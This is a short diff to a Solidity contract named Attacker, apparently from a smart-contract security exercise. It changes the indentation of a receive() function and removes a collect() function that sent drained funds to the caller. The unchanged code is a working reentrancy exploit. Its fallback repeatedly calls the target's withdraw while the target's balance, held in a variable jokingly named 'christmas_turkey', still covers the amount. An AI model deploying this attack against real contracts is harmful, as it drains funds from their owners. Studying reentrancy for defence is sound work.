@@ -19,14 +19,11 @@ contract Attacker {
         target.deposit{value: msg.value}();
         target.withdraw(amount);
     }
-    receive() external payable {
+      receive() external payable {
         uint christmas_turkey = address(target).balance;
         if( christmas_turkey >= amount) {
             target.withdraw(amount);
         }
     }
 
-    function collect() external {
-        payable(msg.sender).transfer(address(this).balance);
-    }
 }
